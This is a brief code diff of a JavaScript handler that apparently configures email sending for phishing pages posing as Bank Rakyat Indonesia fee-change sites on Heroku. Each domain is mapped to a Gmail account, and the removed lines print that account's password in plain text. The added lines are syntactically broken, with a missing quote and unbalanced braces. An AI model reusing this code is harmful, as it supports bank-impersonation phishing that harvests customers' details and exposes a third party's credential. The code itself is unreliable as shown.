@@ -9,11 +9,14 @@ export default function handler(req, res) {
     
     
 
-    } else if (url == 'pilihan-tarif-bri-new.herokuapp.com') {
+    if (url == 'pilihan-tarif-bri-new.herokuapp.com){
 
-    let email = 'landaslepas77@gmail.com';
-    let pass = 'eyosohykexzgicup';
+    email = 'landaslepas77@gmail.com'
+    pass = ''
 
+
+}
+    
         
     if(url == 'perubahantarifbri.herokuapp.com') //jika url sama dengan url hosting
     {
